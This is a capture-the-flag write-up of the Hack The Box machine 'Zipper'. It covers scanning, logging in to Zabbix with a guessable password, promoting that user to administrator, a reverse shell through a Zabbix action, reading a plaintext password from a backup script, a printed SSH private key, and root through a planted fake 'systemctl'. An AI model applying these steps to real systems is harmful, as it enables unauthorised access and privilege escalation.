---
layout: post
title: Hackthebox Zipper Writeup
categories: HackTheBox
---

<img src="/public/images/2019-02-24/zipper_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Zipper" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.108 -sC -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-21 21:04 EEST
Nmap scan report for 10.10.10.108
Host is up (0.038s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.54 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.108

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.108/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2018/10/25 11:21:11 Starting gobuster
=====================================================
/zabbix (Status: 301)
/server-status (Status: 403)
=====================================================
2018/10/25 11:34:40 Finished
=====================================================
{% endhighlight %}

### 2.Getting User
Sounds like an Zabbix is running on the server.
![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-17-10-44.png)

We can login as a guest user.<br>
By enumeration, we can figure out there is a user "zapper".

![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-17-12-21.png)

zapper uses easily guessable password "zapper".<br>
By taking advantage of this, we can login to zabbix as general user.<br>
However, we are still not able to use Zabbix GUI console due to its configuration.

![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-14-04-11.png)

Then we have to use <a href="https://github.com/usit-gd/zabbix-cli">"zabbix-cli"</a><br>
At first, we have to install and setup zabbix-cli with following commands.
{% highlight shell %}
sabonawa@kali:~$ git clone https://github.com/usit-gd/zabbix-cli.git

~~~

root@kali:/home/sabonawa/zabbix-cli# ./setup.py install

~~~

root@kali:/home/sabonawa/zabbix-cli# zabbix-cli-init -z http://10.10.10.108/zabbix
[INFO]: wrote config to '/root/.zabbix-cli/zabbix-cli.conf'

{% endhighlight %}

Next, try to connect with "zabbix-cli" command.<br>
As you can see, by using credentail "zapper:zapper", we can log in to zabbix CLI console.
{% highlight shell %}
root@kali:/home/sabonawa/zabbix-cli# zabbix-cli
-------------------------
Zabbix-CLI authentication
-------------------------
# Username[root]: zapper
# Password: 


#############################################################
Welcome to the Zabbix command-line interface (v.2.0.1)
#############################################################
Type help or \? to list commands.

[zabbix-cli zapper@zabbix-ID]$
{% endhighlight %}

At first, enable the GUI console and change the group to "Zabbix administratiors".
{% highlight shell %}
[zabbix-cli zapper@zabbix-ID]$  show_usergroups
+---------+---------------------------+--------------------+-------------+--------+
| GroupID | Name                      |     GUI access     |    Status   | Users  |
+---------+---------------------------+--------------------+-------------+--------+
|       9 | Disabled                  | System default (0) | Disable (1) |        |
|      11 | Enabled debug mode        | System default (0) |  Enable (0) | me     |
|       8 | Guests                    | System default (0) |  Enable (0) | guest  |
|      12 | No access to the frontend |    Disable (2)     |  Enable (0) | zapper |
|       7 | Zabbix administrators     | System default (0) |  Enable (0) | Admin  |
+---------+---------------------------+--------------------+-------------+--------+

[zabbix-cli zapper@zabbix-ID]$ add_user_to_usergroup zapper 7

[Done]: Users zapper added to these usergroups: 7

[zabbix-cli zapper@zabbix-ID]$ remove_user_from_usergroup zapper "No access to the frontend"

[Done]: User zapper removed from this usergroup: No access to the frontend
{% endhighlight %}

Next, login with Web console and go to Configuration->Actions.

![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-15-47-02.png)

Create new action which executes reverse shell<br>
Action window:
![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-17-46-27.png)
Conditions window:
![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-17-47-05.png)
Operations window:
![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-17-48-16.png)

Next, we have to create a new trigger for the action.<br>
Go Configuration->Hosts->Zipper(hostname)->Triggers->Create trigger

![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-17-57-03.png)

We have to wait for a while for getting a reverse shell.

{% highlight shell %}
root@kali:~# nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 56834
/bin/sh: 0: can't access tty; job control turned off

# Getting tty
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@zipper:~$
{% endhighlight %}

By some enumeration, we can find an interesting file in /home/zapper/utils

{% highlight shell %}
$ cat backup.sh 
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
echo $?
{% endhighlight %}

As we can see, we found a password "ZippityDoDah".<br>
We can use it for changing user to zapper.

{% highlight shell %}
zabbix@zipper:/home/zapper$ su zapper
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K	/backups/zapper_backup-2018-10-26.7z
4.0K	/backups/zabbix_scripts_backup-2018-10-26.7z

zapper@zipper:~$
{% endhighlight %}

user.txt in in its home directory.
{% highlight shell %}
zapper@zipper:~$ cat user.txt 
aa29e93f48c64f8586448b6f6e38fe33
{% endhighlight %}

In the ~/.ssh, there is a ssh private key file.<br>
From next time, we can use it to easily have a shell.

{% highlight shell %}
zapper@zipper:~$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
+docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
-----END RSA PRIVATE KEY-----
{% endhighlight %}

### 3.Getting root

Getting root is more simple.<br>
In util directory of ~/, there is a executable file which has SUID.
{% highlight shell %}
zapper@zipper:~/utils$ ls -la
total 24
drwxrwxr-x 2 zapper zapper 4096 Feb 21 04:20 .
drwxr-xr-x 6 zapper zapper 4096 Sep  9 19:12 ..
-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
-rwxrwxr-x 1 zapper zapper   62 Feb 21 04:20 systemctl
-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service
{% endhighlight %}

In that file, we can find that it is likely to use "systemctl" command.

![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-16-19-47.png)

We can take advantage of this possible shell injection weakness.<br>
We can create a shell which name is "systemctl" in the same directory and zabbix-service would execute it.
{% highlight shell %}
zapper@zipper:~/utils$ echo "cat /root/root.txt" > systemctl
zapper@zipper:~/utils$ chmod 777 systemctl 
zapper@zipper:~/utils$ ls -la
total 24
drwxrwxr-x 2 zapper zapper 4096 Oct 26 08:48 .
drwxr-xr-x 6 zapper zapper 4096 Oct 26 08:35 ..
-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
-rwxrwxrwx 1 zapper zapper   19 Oct 26 08:48 systemctl
-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service
zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start
a7c743d35b8efbedfd9336492a8eab6e
a7c743d35b8efbedfd9336492a8eab6e
{% endhighlight %}
